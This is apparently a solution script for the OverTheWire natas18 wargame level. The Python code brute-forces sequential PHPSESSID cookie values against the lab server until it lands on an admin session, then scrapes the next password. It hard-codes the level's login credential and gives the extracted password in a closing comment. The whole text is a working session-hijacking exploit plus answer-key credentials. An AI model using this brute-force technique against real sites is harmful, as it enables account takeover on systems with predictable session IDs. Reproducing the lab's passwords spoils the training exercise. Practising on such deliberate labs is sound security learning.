import requests
import re

url = 'http://natas18.natas.labs.overthewire.org/'
auth = requests.auth.HTTPBasicAuth('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

for i in range(1,641):
    cookies = {'PHPSESSID': str(i)}
    response = requests.post(url,auth=auth,cookies=cookies)

    print(i)
    if 'You are an admin.' in response.text:
        password = re.findall('Password: (.*)</pre>', response.text)
        print(password[0])
        break

# 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
